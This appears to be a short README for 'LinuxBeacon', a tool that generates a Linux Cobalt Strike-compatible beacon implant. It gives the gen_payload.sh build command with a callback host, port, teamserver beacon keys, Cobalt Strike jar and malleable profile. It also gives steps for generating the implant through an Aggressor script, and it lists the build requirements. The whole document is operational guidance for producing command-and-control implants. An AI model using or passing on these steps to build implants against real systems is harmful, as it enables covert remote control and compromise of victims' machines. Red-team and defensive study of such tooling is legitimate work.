# Generate LinuxBeacon

## CLI

```bash
cd /path/to/LinuxBeacon/tools

bash gen_payload.sh \
  --host 192.168.100.98 --port 8088 --https 0 \
  --beacon-keys /path/.cobaltstrike.beacon_keys \
  --cs-jar /path/untitled.jar \
  --java-home /path/jdk1.8.0_501 \
  --bridge jar \
  --profile /path/default.profile \
  --out beacon
```

Optional: `--debug` (implant `-g -DDEBUG`).

Output: `implant/bin/beacon`

## Aggressor

1. Script Manager → Load `LinuxBeacon/CustomBeacon.cna`  
   (must stay next to `tools/` and `implant/`; root is auto via `script_resource()`)
2. **LinuxBeacon → Generate**
3. Fill: listener, beacon_keys, cs_jar, java_home (JDK folder), optional profile/debug
4. Generate → `implant/bin/<name>`

## Required on build host

- JDK 8+ (`java`/`javac`)
- `gcc`, `make`, `libssl`, `libcurl`, `python3`, `bash`
- CS 4.5 jar + teamserver `.cobaltstrike.beacon_keys`
